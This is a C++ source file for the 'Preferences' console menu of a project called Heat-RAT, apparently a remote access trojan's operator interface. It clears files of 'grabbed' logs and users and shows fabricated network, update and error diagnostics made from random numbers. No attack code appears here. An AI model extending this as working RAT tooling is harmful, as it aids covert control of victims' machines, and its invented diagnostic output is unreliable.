/*
##########################################################################################################################
|....######....##.............######.....###...............####################.............######......###..............|
|....######....##.............#####.......##...............#.######.######.####..............#####.......##..............|
|..............##.....############.........######....#####.....##.....##.....##....#####.....####.........######....#####|
|..............##.............###.....#.....#####.....####.....##.....##.....##.............####.....#....######....#####|
|..............##.............###............####.....#########################...........#####............#####....#####|
|....######....##.....##########..............###.....########################....##.......##..............#####....#####|
|....#####.....##..............................##.....####.....##.....##.....##....####......................###....#####|
|....######....##..................#######.....##.....####.....##.....##.....##....#####..........#######....###....#####|
|                                                    by: Nick_Vinesmoke                                                  |
|                                             https://github.com/Nick-Vinesmoke                                          |
|                                        https://github.com/Nick-Vinesmoke/Heat-RAT                                      |
##########################################################################################################################
*/


#include "main.h"
#include "transfer.h"
#include "modules.h"

void Preferences()
{

	HANDLE  hConsole;
	hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
	FlushConsoleInputBuffer(hConsole);
	int col = 9;
	bool logoShow = true;
	std::string command = "";
	std::string something = "";
	logoShow = true;
	system("cls");

	while (true)
	{
		if (logoShow)
		{
			col = 13;
			SetConsoleTextAttribute(hConsole, col);
			std::cout << Modules::logo << std::endl;
			col = 9;
			SetConsoleTextAttribute(hConsole, col);
			printf("%40s-----------------------------------------\n", Modules::space.c_str());
			printf("%40s|              Preferences              |\n", Modules::space.c_str());
			printf("%40s-----------------------------------------\n", Modules::space.c_str());
			printf("Hi %s!!!\n>>> !help ==for==> command list\n", Modules::curentUSER.c_str());
		}
		col = 6;
		SetConsoleTextAttribute(hConsole, col);
		printf(">>> ");
		col = 11;
		SetConsoleTextAttribute(hConsole, col);
		std::cin >> command;
		logoShow = false;
		if (command == "!help")
		{
			Help(Modules::commands_preferences);
		}
		if (command == "!menu")
		{
			system("cls");
			logoShow = true;
			break;
		}
		if (command == "!network")
		{
			col = 8;
			SetConsoleTextAttribute(hConsole, col);
			std::cout << "\n\n";
			printf("testing...\n");
			printf("[");
			for (int i = 0; i <= 60; i++)
			{
				printf("=");
				Sleep(100);
			}
			printf("]\n");
			srand(time(NULL));
			int speed = rand() % (100 - 10) + 10;
			printf("download ===> %d\n", speed);
			printf("upload ===> %d", speed + rand() % (20 - -3) + -3);
			std::cout << "\n\n";
		}
		if (command == "!reset")
		{
			std::string logs = "Modules\\Grabbed\\logs.txt";
			std::string user = "Modules\\Grabbed\\users.txt";
			std::string prefrences = "Modules\\Preferences\\ports.txt";
			col = 8;
			SetConsoleTextAttribute(hConsole, col);
			std::cout << "\n\n";
			printf("wait...\n");
			printf("[");
			for (int i = 0; i <= 60; i++)
			{
				printf("=");
				Sleep(5);
			}
			printf("]\n");
			std::ofstream newfile;
			newfile.open(prefrences);
			if (newfile.is_open())
			{
				col = 2;
				SetConsoleTextAttribute(hConsole, col);
				printf("done!!!\n");
			}
			else
			{

				col = 4;
				SetConsoleTextAttribute(hConsole, col);
				printf("Fatal ERROR!!!\n");
			}
			newfile.close();
			std::ofstream newUser;
			newUser.open(user);
			if (newUser.is_open())
			{
				col = 2;
				SetConsoleTextAttribute(hConsole, col);
				printf("done!!!\n");
			}
			else
			{

				col = 4;
				SetConsoleTextAttribute(hConsole, col);
				printf("Fatal ERROR!!!\n");
			}
			newUser.close();
			std::ofstream newLogs;
			newLogs.open(logs);
			if (newLogs.is_open())
			{
				newLogs << "EMPTY";
				col = 2;
				SetConsoleTextAttribute(hConsole, col);
				printf("done!!!\n");
			}
			else
			{

				col = 4;
				SetConsoleTextAttribute(hConsole, col);
				printf("Fatal ERROR!!!\n");
			}
			newLogs.close();
			col = 2;
			SetConsoleTextAttribute(hConsole, col);
			printf("done!!!\n");
			col = 9;
			SetConsoleTextAttribute(hConsole, col);
			system("pause");
			system("cls");
			logoShow = true;
			break;
		}
		if (command == "!update")
		{
			col = 8;
			SetConsoleTextAttribute(hConsole, col);
			std::cout << "\n\n";
			printf("checking...\n");
			printf("[");
			for (int i = 0; i <= 60; i++)
			{
				printf("=");
				Sleep(100);
			}
			printf("]\n");
			col = 2;
			SetConsoleTextAttribute(hConsole, col);
			printf("latest version installed\n");
			col = 9;
			SetConsoleTextAttribute(hConsole, col);
			std::cout << "\n\n";
		}
		if (command == "!errors")
		{
			col = 8;
			SetConsoleTextAttribute(hConsole, col);
			std::cout << "\n\n";
			printf("checking...\n");
			printf("[");
			for (int i = 0; i <= 60; i++)
			{
				printf("=");
				Sleep(2);
			}
			printf("]\n");
			srand(time(NULL));
			int max = rand() % (8 - 0) + 0;
			col = 8;
			SetConsoleTextAttribute(hConsole, col);
			for (int i = 0; i < max; i++)
			{

				printf("ERROR ==> %d\n", rand() % (999 - 111) + 111);
			}
			col = 11;
			SetConsoleTextAttribute(hConsole, col);
			std::cout << "\n\n";
		}
		if (command == "!experimentalMode")
		{
			std::cout << "\n\n";
			col = 8;
			SetConsoleTextAttribute(hConsole, col);
			printf("Do you want to turn on experimental mode? (y/n) ");
			col = 11;
			SetConsoleTextAttribute(hConsole, col);
			std::cin >> something;
			col = 8;
			SetConsoleTextAttribute(hConsole, col);
			if (something == "y")
			{
				printf("starting...\n");
				printf("[");
				for (int i = 0; i <= 60; i++)
				{
					printf("=");
					Sleep(2);
				}
				printf("]\n");
				col = 2;
				SetConsoleTextAttribute(hConsole, col);
				printf("done!!!\n");
				col = 9;
				SetConsoleTextAttribute(hConsole, col);
				system("pause");
				system("cls");
				logoShow = true;
				break;
			}
			if (something == "n")
			{
				printf("finishing...\n");
				printf("[");
				for (int i = 0; i <= 60; i++)
				{
					printf("=");
					Sleep(2);
				}
				printf("]\n");
				col = 2;
				SetConsoleTextAttribute(hConsole, col);
				printf("done!!!\n");
				col = 11;
				SetConsoleTextAttribute(hConsole, col);
				system("pause");
				system("cls");
				logoShow = true;
				break;
			}
			else if (something != "n" && something != "y")
			{
				col = 4;
				SetConsoleTextAttribute(hConsole, col);
				printf("ERROR ==> 832\n");
				col = 11;
				SetConsoleTextAttribute(hConsole, col);
			}
		}
		else if ( command != "!experimentalMode" && command != "!errors" && command != "!reset" && command != "!update" && command != "!network" && command != "!help" && command != "!menu")
		{
			std::cout << "\n\n";
			col = 4;
			SetConsoleTextAttribute(hConsole, col);
			printf("unknown command!!!\n");
			col = 11;
			SetConsoleTextAttribute(hConsole, col);
			std::cout << "\n\n";
		}
	}


}